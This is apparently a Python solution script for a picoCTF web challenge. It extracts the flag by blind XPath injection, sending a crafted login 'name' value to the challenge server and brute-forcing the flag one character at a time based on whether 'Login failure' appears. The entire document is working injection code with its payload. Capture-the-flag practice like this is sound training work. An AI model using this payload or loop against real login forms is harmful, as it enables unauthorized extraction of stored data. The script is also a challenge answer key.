alphabet = "_abcdefghijklmnopqrstuvwxyz1234567890()ABCDEFGHIJKLMNOPQRSTUVXWYZ{}"
import requests
s = requests.Session()
flag = "picoCTF{"
while flag[-1] != '}':
    for i in range(len(alphabet)):
        try:
            r = s.post("http://mercury.picoctf.net:59946/", data={"name":"bob' and //*[contains(text(),'"+flag+alphabet[i]+"')] or ''='","pass":"admin"}, timeout=1)
            if ("Login failure" not in r.text):
                flag += alphabet[i]
                print("[+] Flag: " + flag,flush=True)
                break
        except:
            i-=1